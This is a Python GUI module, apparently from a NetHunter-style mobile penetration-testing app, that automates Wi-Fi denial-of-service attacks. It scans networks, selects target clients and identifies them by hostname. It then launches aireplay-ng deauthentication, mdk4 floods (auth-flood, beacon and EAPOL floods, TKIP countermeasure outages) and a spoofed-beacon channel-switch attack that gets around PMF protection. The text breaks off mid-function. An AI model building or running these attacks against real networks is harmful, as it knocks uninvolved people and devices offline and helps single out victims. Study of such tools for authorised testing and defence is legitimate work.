"""802.11 deauthentication attack driver with monitor-mode setup + scan + target picker.

The whole point of this screen is to make deauth easy to run without going
anywhere near a terminal *and* without accidentally killing the phone's own
Wi-Fi. The stock `airmon-ng check kill` call that most tutorials open with
kills wpa_supplicant and NetworkManager on every interface, which on this
port means wlan0 goes down and SSH with it -- if you were driving the phone
over SSH you just locked yourself out.

Instead this module isolates only the external adapter (wlan1 by default):

    nmcli device set wlan1 managed no    # NM stops touching this NIC
    iw dev wlan1 del                     # drop the managed vif
    iw phy phyN interface add wlan1mon type monitor
    ip link set wlan1mon up

wpa_supplicant on wlan0 stays alive, the phone keeps its internet, and SSH
never notices anything happened. The Disable button reverses every step.

The scan runs airodump-ng with CSV output and re-reads that file on a short
timer, so partial results paint the tables as the sweep progresses. Once a
target network is picked, a follow-up airodump run locks to that BSSID and
channel to enumerate clients (the initial broadband sweep hops channels and
so misses most stations).

The attack itself is aireplay-ng in --deauth mode. Three shapes:

  * "This client" -- targeted deauth with `-a <BSSID> -c <STA>`; only the
    picked client sees the frames. Cleanest.
  * "All clients"  -- fires aireplay per station in the table, sequentially,
    the same way wifite/mdk4 do. Every station on the AP loses its
    association.
  * "Broadcast"   -- omits `-c`; aireplay sends to the ff:ff broadcast MAC.
    Every station on the AP AND anyone probing for the SSID picks it up.
    Loudest, most disruptive, drops clients that are only associating.

Count 0 in aireplay = infinite (until Stop is pressed).
"""
from __future__ import annotations

import csv
import io
import os
import re

from gi.repository import Adw, GLib, Gtk

from ..executor import Process, Result, run_async, which
from ..module import NHModule, register
from ..widgets import OutputView, services_banner, toast

# Default external adapter and the monitor-mode alias airmon-ng creates.
# The user can override the physical interface if they have a different
# adapter plugged in.
DEFAULT_IFACE = "wlan1"
MON_SUFFIX = "mon"

# Where airodump-ng dumps its per-scan CSV. Two files land here: the
# BSSID/AP table above and the station/client table below, separated by a
# blank line + a "Station MAC" header row.
SCAN_PREFIX = "/tmp/nhp-deauth-scan"


def _mon_iface(base: str) -> str:
    return base + MON_SUFFIX


def _phy_for(iface: str) -> str | None:
    """Return the phyN string for a given wireless interface, or None."""
    try:
        target = os.readlink("/sys/class/net/%s/phy80211" % iface)
    except OSError:
        return None
    # e.g. "../../ieee80211/phy1" -> "phy1"
    return target.rsplit("/", 1)[-1]


# airodump-ng CSV has two tables in one file: APs at the top, then a blank
# line, then stations. Split on the "Station MAC" header row.
_STATION_HEADER = "Station MAC, First time seen"


def _parse_airodump_csv(text: str) -> tuple[list[dict], list[dict]]:
    """Parse airodump-ng CSV into (aps, stations)."""
    if not text:
        return [], []
    # Split at the station header line.
    parts = re.split(r"^Station MAC.*$", text, maxsplit=1, flags=re.M)
    ap_block = parts[0]
    st_block = parts[1] if len(parts) > 1 else ""
    aps: list[dict] = []
    stations: list[dict] = []
    # AP rows -- one CSV row per line, may have commas inside the ESSID
    # field but airodump does not quote them; count columns and take the
    # last one as the whole ESSID.
    for line in ap_block.splitlines():
        line = line.strip()
        if not line or line.startswith("BSSID"):
            continue
        fields = [f.strip() for f in line.split(",")]
        if len(fields) < 14 or not re.match(r"^[0-9A-F:]{17}$", fields[0]):
            continue
        # ESSID is field 13, Key is field 14 (usually empty). ESSID *can*
        # contain commas, so join everything between fields[13:-1] and drop
        # the trailing Key column. If the row is shy of the Key column,
        # just take fields[13:].
        essid_parts = fields[13:-1] if len(fields) >= 15 else fields[13:]
        essid = ",".join(essid_parts).strip().rstrip(",").strip()
        aps.append({
            "bssid": fields[0],
            "channel": fields[3],
            "privacy": fields[5],
            "cipher": fields[6],
            "auth": fields[7],
            "power": fields[8],
            "beacons": fields[9],
            "essid": essid,
        })
    # Station rows -- much simpler shape.
    for line in st_block.splitlines():
        line = line.strip()
        if not line or line.startswith("Station"):
            continue
        fields = [f.strip() for f in line.split(",")]
        if len(fields) < 6 or not re.match(r"^[0-9A-F:]{17}$", fields[0]):
            continue
        stations.append({
            "mac": fields[0],
            "power": fields[3],
            "packets": fields[4],
            "bssid": fields[5],
        })
    return aps, stations


@register
class Deauth(NHModule):
    title = "Deauth"
    icon = "network-wireless-disabled-symbolic"
    description = "Kick clients off Wi-Fi networks with 802.11 deauth frames"
    required_tools = ["airodump-ng", "aireplay-ng", "iw"]

    def __init__(self, app_window):
        super().__init__(app_window)
        self._scan_proc: Process | None = None
        self._attack_proc: Process | None = None
        self._scan_timer_id: int | None = None
        self._networks: list[dict] = []
        self._stations: list[dict] = []
        self._selected_ap: dict | None = None
        self._network_rows: list[Adw.ExpanderRow] = []
        self._station_rows: list[Adw.ActionRow] = []
        self._target_station: str | None = None
        self._monitor_iface: str | None = None
        # MAC (uppercase, colon-delimited) -> friendly name. Filled in
        # by _resolve_hostnames() which runs in parallel with the focused
        # airodump scan.  We can only resolve names for MACs that are
        # currently on the same LAN as our own wlan0 -- i.e. clients of
        # the very AP we're targeting -- because avahi/mDNS + arp-scan
        # both need L2 reachability. That is exactly the case here since
        # wlan0 is joined to the target AP (that's how we ended up on the
        # same subnet as the phone we're going to deauth in the first
        # place).
        self._mac_names: dict[str, str] = {}
        self._resolve_proc: Process | None = None

    # -------------------------------------------------------------- build
    def build(self) -> Gtk.Widget:
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        for m in ("top", "bottom", "start", "end"):
            getattr(box, "set_margin_" + m)(12)

        # avahi-daemon improves the hostname resolve for target
        # clients; NetworkManager needs to stay up on the phone's
        # own Wi-Fi so we can restore the external adapter cleanly.
        box.append(services_banner(
            self.app_window,
            ["avahi-daemon", "NetworkManager"]))

        # ---- monitor mode setup -----------------------------------
        mon_group = Adw.PreferencesGroup(
            title="Monitor mode",
            description="Puts an external adapter into monitor mode without "
                        "touching NetworkManager on the phone's own Wi-Fi. "
                        "SSH survives the switch.")
        self.iface_entry = Adw.EntryRow(title="External interface")
        self.iface_entry.set_text(DEFAULT_IFACE)
        mon_group.add(self.iface_entry)

        self.mon_row = Adw.ActionRow(
            title="Enable monitor mode", subtitle="Not enabled")
        self.mon_toggle = Gtk.Switch(valign=Gtk.Align.CENTER)
        self.mon_toggle.connect("state-set", self._on_monitor_toggle)
        self.mon_row.add_suffix(self.mon_toggle)
        mon_group.add(self.mon_row)
        box.append(mon_group)

        # ---- scan networks -----------------------------------------
        scan_group = Adw.PreferencesGroup(
            title="Networks",
            description="airodump-ng sweeps the selected band(s). Live results "
                        "appear below as they're found.")

        self.band = Adw.ComboRow(title="Band")
        self.band.set_model(Gtk.StringList.new([
            "2.4 GHz + 5 GHz",
            "2.4 GHz only (channels 1-14)",
            "5 GHz only (channels 36+)",
        ]))
        scan_group.add(self.band)

        self.scan_duration = Adw.SpinRow.new_with_range(0, 3600, 5)
        self.scan_duration.set_title(
            "Max scan duration (s) -- 0 = until Stop")
        self.scan_duration.set_value(0)
        scan_group.add(self.scan_duration)

        scan_action = Adw.ActionRow(
            title="Scan for networks",
            subtitle="Enable monitor mode first")
        self.scan_btn = Gtk.Button(label="Scan", valign=Gtk.Align.CENTER)
        self.scan_btn.add_css_class("suggested-action")
        self.scan_btn.connect("clicked", lambda _b: self._start_scan())
        scan_action.add_suffix(self.scan_btn)
        self.scan_stop_btn = Gtk.Button(label="Stop", valign=Gtk.Align.CENTER)
        self.scan_stop_btn.set_sensitive(False)
        self.scan_stop_btn.connect("clicked", lambda _b: self._stop_scan())
        scan_action.add_suffix(self.scan_stop_btn)
        scan_group.add(scan_action)
        box.append(scan_group)

        self.networks_group = Adw.PreferencesGroup(title="Discovered networks")
        self._empty_nets = Adw.ActionRow(
            title="No networks yet",
            subtitle="Enable monitor and press Scan")
        self.networks_group.add(self._empty_nets)
        box.append(self.networks_group)

        # ---- selected target + attack ------------------------------
        self.target_group = Adw.PreferencesGroup(
            title="Selected target",
            description="Pick a network above; its clients (stations) will "
                        "load here for individual deauth.")
        self._empty_target = Adw.ActionRow(
            title="No network selected", subtitle="")
        self.target_group.add(self._empty_target)
        box.append(self.target_group)

        # attack controls
        attack_group = Adw.PreferencesGroup(
            title="Attack",
            description="One target at a time or the whole network at once.")

        self.attack_mode = Adw.ComboRow(title="Mode")
        self.attack_mode.set_model(Gtk.StringList.new([
            "Selected client only",
            "All clients on this network",
            "Broadcast (whole AP)",
        ]))
        attack_group.add(self.attack_mode)

        self.attack_count = Adw.SpinRow.new_with_range(0, 10000, 10)
        self.attack_count.set_title("Deauth bursts (0 = continuous)")
        self.attack_count.set_value(0)
        attack_group.add(self.attack_count)

        attack_row = Adw.ActionRow(
            title="Start deauth",
            subtitle="One aireplay-ng burst = 64 frames")
        self.attack_btn = Gtk.Button(label="Start", valign=Gtk.Align.CENTER)
        self.attack_btn.add_css_class("destructive-action")
        self.attack_btn.set_sensitive(False)
        self.attack_btn.connect("clicked", lambda _b: self._start_attack())
        attack_row.add_suffix(self.attack_btn)
        self.attack_stop_btn = Gtk.Button(label="Stop", valign=Gtk.Align.CENTER)
        self.attack_stop_btn.set_sensitive(False)
        self.attack_stop_btn.connect("clicked", lambda _b: self._stop_attack())
        attack_row.add_suffix(self.attack_stop_btn)
        attack_group.add(attack_row)
        box.append(attack_group)

        # ---- advanced flood + CSA ---------------------------------
        # mdk4 exposes half a dozen attack "modes" that go beyond the
        # aireplay deauth: auth-flood to knock over an AP, beacon
        # spam to poison client scan lists, EAPOL flood against
        # WPA-Enterprise, TKIP Michael countermeasure to force
        # 60 s outages against legacy APs, probe brute-force for
        # hidden SSIDs and WIDS confusion.
        #
        # Channel Switch Announcement (CSA) attack sits alongside
        # because it is the only reliable way to eject clients from
        # an AP that has PMF (802.11w) required -- deauth broadcast
        # gets dropped, but CSA frames are unprotected by design and
        # every client we've tested obeys them.
        adv_group = Adw.PreferencesGroup(
            title="Advanced (mdk4 + CSA)",
            description="Uses the raw monitor interface directly. "
                        "Runs independently of the scan/target above.")
        self.mdk4_mode = Adw.ComboRow(title="mdk4 mode")
        self.mdk4_mode.set_model(Gtk.StringList.new([
            "a — Auth-flood (crashes many SOHO APs)",
            "b — Beacon flood (SSID-list DoS on clients)",
            "d — Deauth/Disassoc flood (same as aireplay)",
            "e — EAPOL Start flood (WPA-Enterprise DoS)",
            "m — Michael countermeasure (TKIP-only APs)",
            "p — Probe flood / hidden SSID brute-force",
            "w — WIDS/WIPS confusion",
            "x — Wi-Fi Direct de-auth",
        ]))
        adv_group.add(self.mdk4_mode)

        self.mdk4_target = Adw.EntryRow(
            title="Target BSSID / MAC / SSID (mode-dependent)")
        adv_group.add(self.mdk4_target)

        mdk4_row = Adw.ActionRow(
            title="Run mdk4",
            subtitle="Streams into the log below. Stop when done.")
        self.mdk4_btn = Gtk.Button(label="Start",
                                   valign=Gtk.Align.CENTER)
        self.mdk4_btn.add_css_class("destructive-action")
        self.mdk4_btn.connect("clicked",
                              lambda _b: self._start_mdk4())
        mdk4_row.add_suffix(self.mdk4_btn)
        self.mdk4_stop_btn = Gtk.Button(label="Stop",
                                        valign=Gtk.Align.CENTER)
        self.mdk4_stop_btn.set_sensitive(False)
        self.mdk4_stop_btn.connect("clicked",
                                   lambda _b: self._stop_mdk4())
        mdk4_row.add_suffix(self.mdk4_stop_btn)
        adv_group.add(mdk4_row)

        # CSA. We drive it via a small Scapy one-liner rather than
        # a separate tool -- there's no packaged Kali CLI for CSA
        # attack that we can rely on across versions. The Scapy
        # snippet spoofs a beacon from the target BSSID carrying
        # a CSA IE (tag 37) with the new channel and 3-beacon
        # count-down, which is the shape every client accepts.
        csa_row = Adw.ActionRow(
            title="CSA attack (bypass PMF)",
            subtitle="Force clients of a target BSSID to jump to a "
                     "channel where no AP is waiting for them")
        self.csa_bssid = Adw.EntryRow(title="Target BSSID")
        adv_group.add(self.csa_bssid)
        self.csa_new_channel = Adw.SpinRow.new_with_range(1, 165, 1)
        self.csa_new_channel.set_title("New channel to jump to")
        self.csa_new_channel.set_value(1)
        adv_group.add(self.csa_new_channel)
        self.csa_count = Adw.SpinRow.new_with_range(1, 1000, 5)
        self.csa_count.set_title("Beacon spoof count")
        self.csa_count.set_value(20)
        adv_group.add(self.csa_count)

        csa_btn = Gtk.Button(label="Fire CSA",
                             valign=Gtk.Align.CENTER)
        csa_btn.add_css_class("destructive-action")
        csa_btn.connect("clicked", lambda _b: self._fire_csa())
        csa_row.add_suffix(csa_btn)
        adv_group.add(csa_row)
        box.append(adv_group)

        # ---- live log ---------------------------------------------
        self.output = OutputView()
        box.append(self.output)

        # Detect existing monitor iface at startup so the toggle reflects
        # reality (e.g. if the previous session left it on).
        self._detect_existing_monitor()
        return box

    # ------------------------------------------------------- monitor
    def _detect_existing_monitor(self) -> None:
        iface = self.iface_entry.get_text().strip() or DEFAULT_IFACE
        mon = _mon_iface(iface)

        def done(r: Result) -> None:
            if r.stdout and "type monitor" in r.stdout:
                self._monitor_iface = mon
                self.mon_toggle.handler_block_by_func(self._on_monitor_toggle)
                self.mon_toggle.set_active(True)
                self.mon_toggle.handler_unblock_by_func(self._on_monitor_toggle)
                self.mon_row.set_subtitle(
                    "%s is already in monitor mode" % mon)

        run_async(["sh", "-c", "iw dev %s info 2>/dev/null || iw dev %s info 2>/dev/null"
                   % (mon, iface)], done, root=True, timeout=5)

    def _on_monitor_toggle(self, sw, state) -> bool:
        iface = self.iface_entry.get_text().strip() or DEFAULT_IFACE
        if state:
            self._enable_monitor(iface)
        else:
            self._disable_monitor(iface)
        # Return False so the switch waits for our explicit set_active.
        return True

    def _enable_monitor(self, iface: str) -> None:
        self.mon_row.set_subtitle("Switching %s to monitor…" % iface)
        self.output.append("# enabling monitor mode on %s\n" % iface)
        mon = _mon_iface(iface)
        # Isolated setup that does NOT invoke `airmon-ng check kill`. Steps:
        #  1) Tell NetworkManager to leave this iface alone.
        #  2) Remove the managed vif (`iw dev X del`), which frees the phy.
        #  3) Add a new monitor vif on the same phy.
        #  4) Bring it up.
        # Any step that already applies is skipped by the shell || true.
        script = (
            "IF=%s; MON=%s; "
            "PHY=$(readlink /sys/class/net/$IF/phy80211 2>/dev/null "
            "     | awk -F/ '{print $NF}'); "
            "if [ -z \"$PHY\" ] && [ -e /sys/class/net/$MON/phy80211 ]; then "
            "  PHY=$(readlink /sys/class/net/$MON/phy80211 | awk -F/ '{print $NF}'); "
            "fi; "
            "[ -n \"$PHY\" ] || { echo 'no phy for '$IF; exit 1; }; "
            "nmcli device set $IF managed no 2>/dev/null || true; "
            "iw dev $IF del 2>/dev/null || true; "
            "iw dev $MON del 2>/dev/null || true; "
            "iw phy $PHY interface add $MON type monitor 2>/dev/null || true; "
            "ip link set $MON up && echo ok || echo 'ip link set failed'; "
            "iw dev $MON info | head -6"
        ) % (iface, mon)

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            if r.stderr:
                self.output.append(r.stderr)
            if r.returncode == 0 and "type monitor" in (r.stdout or ""):
                self._monitor_iface = mon
                self.mon_row.set_subtitle("%s is in monitor mode" % mon)
                toast(self.app_window, "Monitor mode on: " + mon)
            else:
                self._monitor_iface = None
                self.mon_row.set_subtitle("Enable failed; see log below")
                self.mon_toggle.handler_block_by_func(self._on_monitor_toggle)
                self.mon_toggle.set_active(False)
                self.mon_toggle.handler_unblock_by_func(self._on_monitor_toggle)

        run_async(["sh", "-c", script], done, root=True, timeout=20)

    def _disable_monitor(self, iface: str) -> None:
        self.mon_row.set_subtitle("Restoring %s to managed…" % iface)
        self.output.append("# disabling monitor mode on %s\n" % iface)
        mon = _mon_iface(iface)
        # Reverse the setup: drop the monitor vif, add a managed vif, hand
        # it back to NetworkManager so the user can reconnect through the
        # GUI as normal.
        script = (
            "MON=%s; IF=%s; "
            "PHY=$(readlink /sys/class/net/$MON/phy80211 2>/dev/null "
            "      | awk -F/ '{print $NF}'); "
            "if [ -z \"$PHY\" ] && [ -e /sys/class/net/$IF/phy80211 ]; then "
            "  PHY=$(readlink /sys/class/net/$IF/phy80211 | awk -F/ '{print $NF}'); "
            "fi; "
            "iw dev $MON del 2>/dev/null || true; "
            "iw dev $IF del 2>/dev/null || true; "
            "[ -n \"$PHY\" ] && iw phy $PHY interface add $IF type managed 2>/dev/null || true; "
            "ip link set $IF up 2>/dev/null || true; "
            "nmcli device set $IF managed yes 2>/dev/null || true; "
            "echo done"
        ) % (mon, iface)

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            self._monitor_iface = None
            self.mon_row.set_subtitle("Not enabled")
            toast(self.app_window, "Monitor mode off")

        run_async(["sh", "-c", script], done, root=True, timeout=15)

    # -------------------------------------------------------------- scan
    def _start_scan(self) -> None:
        if not self._monitor_iface:
            toast(self.app_window,
                  "Enable monitor mode first")
            return
        if self._scan_proc is not None:
            toast(self.app_window, "A scan is already running")
            return

        # Clear previous results.
        for r in self._network_rows:
            self.networks_group.remove(r)
        self._network_rows = []
        self._networks = []
        self._empty_nets.set_title("Scanning…")
        self._empty_nets.set_visible(True)

        # Reset target too since the previous selection might not match
        # anything in the fresh scan.
        for r in self._station_rows:
            self.target_group.remove(r)
        self._station_rows = []
        self._selected_ap = None
        self._target_station = None
        self._empty_target.set_title("No network selected")
        self.attack_btn.set_sensitive(False)

        # Clear any left-over CSVs from previous runs so the awk in the
        # timer never reads stale rows.
        self.output.append("# scanning networks\n")
        self._run_sync(
            "rm -f %s-*.csv %s-*.cap %s-*.kismet.csv %s-*.kismet.netxml "
            "%s.log" % (SCAN_PREFIX, SCAN_PREFIX, SCAN_PREFIX,
                        SCAN_PREFIX, SCAN_PREFIX))

        band_arg = ""
        band_sel = self.band.get_selected()
        if band_sel == 1:
            band_arg = "--band bg"
        elif band_sel == 2:
            band_arg = "--band a"
        # both -> no arg

        duration = int(self.scan_duration.get_value())
        # airodump-ng runs until we kill it; we cap it via a background
        # sleep+kill so the wall clock respects the user's choice.
        cmd = (
            "airodump-ng --output-format csv "
            "--write %s --write-interval 2 %s %s"
            % (SCAN_PREFIX, band_arg, self._monitor_iface)
        )
        self.output.append("$ %s\n" % cmd)

        self._scan_proc = Process(
            ["sh", "-c", cmd],
            self.output.append,
            self._on_scan_done,
            root=True,
        )
        self._scan_proc.start()
        self.scan_btn.set_sensitive(False)
        self.scan_stop_btn.set_sensitive(True)

        # Poll the CSV every 2s while the scan runs so the UI paints
        # results as they come in.
        self._scan_timer_id = GLib.timeout_add_seconds(2, self._tick_scan)
        # And kill airodump after the duration -- unless duration is
        # 0, in which case the user hits Stop when they want.
        if duration > 0:
            GLib.timeout_add_seconds(
                duration, self._auto_stop_scan)

    def _auto_stop_scan(self) -> bool:
        # One-shot; only fires if user did not stop first.
        if self._scan_proc is not None and self._scan_proc.running:
            self._stop_scan()
        return False

    def _stop_scan(self) -> None:
        if self._scan_proc is not None:
            self.output.append("[stopping scan]\n")
            self._scan_proc.stop()

    def _tick_scan(self) -> bool:
        # Read the latest CSV, parse, refresh the networks list.
        csv_path = SCAN_PREFIX + "-01.csv"
        if not os.path.exists(csv_path):
            # airodump also runs as root and writes files owned by root
            # (mode 0644 by default, so we can read them), but if the
            # first write hasn't happened yet, skip.
            return self._scan_proc is not None and self._scan_proc.running
        try:
            with open(csv_path, errors="replace") as f:
                text = f.read()
        except OSError:
            return self._scan_proc is not None and self._scan_proc.running
        aps, stations = _parse_airodump_csv(text)
        # If we've already picked a target AP, keep the station list warm.
        if self._selected_ap is not None:
            bssid = self._selected_ap["bssid"]
            self._stations = [s for s in stations if s.get("bssid") == bssid]
            self._render_stations()
        # Update networks list.
        aps.sort(key=lambda a: -int(a["power"] or "-100"))
        if [a["bssid"] for a in aps] != [a["bssid"] for a in self._networks]:
            self._networks = aps
            self._render_networks()
        else:
            # Same set; refresh in place to update power/beacon counts.
            self._networks = aps
        return self._scan_proc is not None and self._scan_proc.running

    def _on_scan_done(self, code: int) -> None:
        self._scan_proc = None
        self.scan_btn.set_sensitive(True)
        self.scan_stop_btn.set_sensitive(False)
        if self._scan_timer_id is not None:
            GLib.source_remove(self._scan_timer_id)
            self._scan_timer_id = None
        # Final parse in case anything came in on the last write.
        self._tick_scan()
        self.output.append("# scan finished (%d networks)\n"
                           % len(self._networks))

    # -------------------------------------------------- networks list
    def _render_networks(self) -> None:
        for r in self._network_rows:
            self.networks_group.remove(r)
        self._network_rows = []
        if not self._networks:
            self._empty_nets.set_title("No networks yet")
            self._empty_nets.set_visible(True)
            return
        self._empty_nets.set_visible(False)
        for ap in self._networks[:60]:
            self._add_network_row(ap)

    def _add_network_row(self, ap: dict) -> None:
        essid = ap.get("essid") or "(hidden)"
        try:
            power = int(ap.get("power") or "-100")
        except ValueError:
            power = -100
        sub = "ch %s -- %s dBm -- %s" % (
            ap.get("channel", "?"), power,
            ap.get("privacy") or "OPEN")
        row = Adw.ExpanderRow(title=essid, subtitle=sub)
        # Detail rows
        row.add_row(Adw.ActionRow(title="BSSID", subtitle=ap["bssid"]))
        row.add_row(Adw.ActionRow(
            title="Encryption",
            subtitle="%s / %s / %s" % (
                ap.get("privacy") or "-",
                ap.get("cipher") or "-",
                ap.get("auth") or "-")))
        sel_row = Adw.ActionRow(title="Actions")
        pick_btn = Gtk.Button(
            label="Select as target", valign=Gtk.Align.CENTER)
        pick_btn.add_css_class("suggested-action")
        pick_btn.connect("clicked",
                         lambda _b, a=ap: self._select_network(a))
        sel_row.add_suffix(pick_btn)
        row.add_row(sel_row)
        self.networks_group.add(row)
        self._network_rows.append(row)

    # -------------------------------------------------- select target
    def _select_network(self, ap: dict) -> None:
        self._selected_ap = ap
        self._target_station = None
        essid = ap.get("essid") or "(hidden)"
        self._empty_target.set_title("Target: " + essid)
        self._empty_target.set_subtitle(
            "%s -- ch %s -- looking for clients…" % (
                ap["bssid"], ap.get("channel", "?")))
        for r in self._station_rows:
            self.target_group.remove(r)
        self._station_rows = []
        self.attack_btn.set_sensitive(True)

        # Kick off a focused scan on this BSSID+channel. Stop any global
        # scan first so we don't fight for the radio.
        if self._scan_proc is not None:
            self._stop_scan()

        self.output.append(
            "# locking to %s ch %s to find clients\n"
            % (ap["bssid"], ap.get("channel", "?")))
        # Reuse the same CSV path -- rm first, then start airodump locked
        # to the target.
        self._run_sync(
            "rm -f %s-*.csv %s-*.cap %s-*.kismet.csv %s-*.kismet.netxml "
            "%s.log" % (SCAN_PREFIX, SCAN_PREFIX, SCAN_PREFIX,
                        SCAN_PREFIX, SCAN_PREFIX))
        cmd = (
            "airodump-ng -c %s --bssid %s --output-format csv "
            "--write %s --write-interval 2 %s"
            % (ap.get("channel", "1"), ap["bssid"],
               SCAN_PREFIX, self._monitor_iface)
        )
        self.output.append("$ %s\n" % cmd)
        self._scan_proc = Process(
            ["sh", "-c", cmd], self.output.append,
            self._on_scan_done, root=True,
        )
        self._scan_proc.start()
        self.scan_stop_btn.set_sensitive(True)
        self.scan_btn.set_sensitive(False)
        # Cap this focused scan at 20 s -- it usually surfaces every active
        # client in the first two beacon intervals.
        self._scan_timer_id = GLib.timeout_add_seconds(2, self._tick_scan)
        GLib.timeout_add_seconds(20, self._auto_stop_scan)

        # Kick off hostname discovery in parallel. It runs on wlan0 (the
        # phone's own Wi-Fi radio), which is on the same LAN as the
        # target AP -- clients associated to the AP are our L2 neighbors,
        # so avahi/mDNS and arp-scan can see them.
        self._start_hostname_resolve()

    def _start_hostname_resolve(self) -> None:
        """Populate self._mac_names with friendly names for LAN neighbors.

        Runs three sources in parallel and merges: avahi-browse (mDNS,
        best for TVs/printers/laptops), the ARP table (already-known
        neighbors -- fast, no network), and arp-scan (broadcasts to poke
        silent devices into replying). Then dig-PTRs each discovered IP
        at the gateway to pull the DHCP hostname the device announced
        when it joined -- this catches Android/iOS phones which stop
        answering mDNS after association.
        """
        if self._resolve_proc is not None and self._resolve_proc.running:
            return  # already resolving; results will land shortly

        # Figure out which local interface we're associated to the target
        # AP through. Almost always wlan0, but not hard-code it.
        script = r'''set -u
        # Pick the interface with a default route -- that's the one on the
        # target LAN. Fall back to wlan0 if nothing is set.
        LAN_IF=$(ip -4 -o route show default 2>/dev/null | awk '{print $5; exit}')
        LAN_IF=${LAN_IF:-wlan0}
        SUBNET=$(ip -4 -o addr show dev "$LAN_IF" 2>/dev/null \
                 | awk '{print $4; exit}')
        GW=$(ip -4 -o route show default 2>/dev/null | awk '{print $3; exit}')
        echo "# resolving on $LAN_IF ($SUBNET) via gw=$GW"

        MAP=/tmp/nhp-deauth-macs.$$
        : > "$MAP"

        # (a) mDNS -- catches things that broadcast Bonjour records.
        # Requires avahi-daemon to be running; the operator turns it
        # on from Kali Services (see the banner at the top of this
        # module). Silently skipped otherwise.
        AVAHI=/tmp/nhp-deauth-avahi.$$
        : > "$AVAHI"
        if command -v avahi-browse >/dev/null 2>&1; then
          timeout 4 avahi-browse -atrp 2>/dev/null \
            | python3 -c '
import sys, re
seen = {}
oct_re = re.compile(r"\\(\d{3})")
def dec(s):
    return oct_re.sub(lambda m: chr(int(m.group(1), 8)), s or "")
for line in sys.stdin:
    p = line.rstrip("\n").split(";")
    if len(p) < 8 or p[0] != "=":
        continue
    ip = p[7]
    if not ip or ":" in ip:
        continue
    if ip in seen:
        continue
    name = dec(p[3])
    fqdn = dec(p[6])
    if fqdn.endswith(".local"):
        fqdn = fqdn[:-6]
    if re.match(r"^[0-9a-f]{4,}-", fqdn.lower()):
        fqdn = ""
    seen[ip] = name or fqdn
for ip, name in seen.items():
    if name:
        print("%s\t%s" % (ip, name))
' > "$AVAHI" 2>/dev/null || true
        fi

        # (b) ARP table (already-populated neighbors) -- fast, no netwk.
        ip -4 neigh show 2>/dev/null \
          | awk '$3=="lladdr" {print toupper($5)"\t"$1"\t"}' >> "$MAP"

        # (c) arp-scan -- pokes every host on the LAN to answer ARP.
        # Capture vendor as a third column so we can use it as a
        # fallback name for non-mDNS devices whose router doesn't hand
        # out reverse-DNS entries (Huawei home routers, most ISP-provided
        # boxes...). "Unknown: locally administered" is arp-scan's way of
        # saying the MAC is randomised and vendor lookup is meaningless;
        # we drop it because it's not useful as a label.
        if command -v arp-scan >/dev/null 2>&1 && [ -n "$SUBNET" ]; then
          arp-scan --interface="$LAN_IF" --localnet \
              --ouifile=/usr/share/arp-scan/ieee-oui.txt \
              --macfile=/dev/null 2>/dev/null \
            | awk -F'\t' 'NF>=2 && $1 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ {
                v = $3
                if (v ~ /locally administered/ || v ~ /^\(Unknown/) v = ""
                print toupper($2)"\t"$1"\t"v
              }' >> "$MAP"
        fi

        # (d) NetBIOS -- Windows machines and older Android that share
        # SMB shells answer this even when they don't do mDNS.
        NBT=/tmp/nhp-deauth-nbt.$$
        : > "$NBT"
        if command -v nbtscan >/dev/null 2>&1 && [ -n "$SUBNET" ]; then
          timeout 4 nbtscan -q "$SUBNET" 2>/dev/null \
            | awk 'NF>=2 && $1 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ && $2!="" && $2!=$1 {print $1"\t"$2}' \
            >> "$NBT"
        fi

        # Now MAP has "MAC<TAB>IP" rows. Also merge in vendor from arp-scan
        # as a fallback name, and try dig-PTR at the gateway for each IP
        # to get the DHCP hostname (highest-quality source for phones).
        GWMAP=/tmp/nhp-deauth-gw.$$
        : > "$GWMAP"
        if command -v dig >/dev/null 2>&1 && [ -n "$GW" ]; then
          # unique IPs from MAP
          awk -F'\t' '{print $2}' "$MAP" | sort -u | while read -r IP; do
            [ -z "$IP" ] && continue
            (
              H=$(timeout 1 dig +short +time=1 +tries=1 -x "$IP" @"$GW" 2>/dev/null | head -1)
              H=${H%%.}
              H=${H%%.local}
              case "$H" in
                ""|"_gateway"|"gateway"|"localhost") ;;
                *) printf '%s\t%s\n' "$IP" "$H" >> "$GWMAP" ;;
              esac
            ) &
          done
          wait
        fi

        # Emit final MAC<TAB>NAME rows, one per unique MAC. Priority:
        # gateway PTR (DHCP hostname) > mDNS name > NetBIOS > OUI vendor.
        # The OUI vendor is the last resort because it's not really a
        # hostname, but "HUAWEI" is still more useful than a bare MAC
        # when the user is trying to figure out which client is which.
        python3 -c '
import sys
def load_kv(path, key_col=0, val_col=1):
    d = {}
    try:
        with open(path) as f:
            for line in f:
                parts = line.rstrip("\n").split("\t")
                if len(parts) <= max(key_col, val_col):
                    continue
                k, v = parts[key_col].strip(), parts[val_col].strip()
                if k and v:
                    d.setdefault(k, v)
    except OSError:
        pass
    return d
# MAP has three cols: MAC<TAB>IP<TAB>VENDOR (vendor may be empty).
mac_ip = {}
mac_vendor = {}
try:
    with open(sys.argv[1]) as f:
        for line in f:
            parts = line.rstrip("\n").split("\t")
            if len(parts) < 2:
                continue
            mac = parts[0].strip().upper()
            ip = parts[1].strip()
            ven = parts[2].strip() if len(parts) >= 3 else ""
            if mac and ip:
                mac_ip.setdefault(mac, ip)
            if mac and ven and mac not in mac_vendor:
                mac_vendor[mac] = ven
except OSError:
    pass
avahi = load_kv(sys.argv[2])  # ip -> name
gw = load_kv(sys.argv[3])     # ip -> name  (dhcp hostname from gateway PTR)
nbt = load_kv(sys.argv[4])    # ip -> name  (netbios)
for mac, ip in mac_ip.items():
    name = (gw.get(ip) or avahi.get(ip) or nbt.get(ip)
            or mac_vendor.get(mac) or "")
    # Trim overly long vendor strings so the row title stays readable.
    if len(name) > 40:
        name = name[:37] + "..."
    print("%s\t%s" % (mac, name))
' "$MAP" "$AVAHI" "$GWMAP" "$NBT"

        rm -f "$MAP" "$AVAHI" "$GWMAP" "$NBT"
        '''

        buf: list[str] = []

        def on_line(text: str) -> None:
            buf.append(text)
            # Also mirror progress lines (# prefixed) to the log so the
            # user can see what's happening.
            if text.startswith("#"):
                self.output.append(text)

        def on_done(code: int) -> None:
            self._resolve_proc = None
            # Parse the emitted MAC<TAB>NAME rows.
            found = 0
            for line in "".join(buf).splitlines():
                if line.startswith("#") or not line.strip():
                    continue
                parts = line.split("\t")
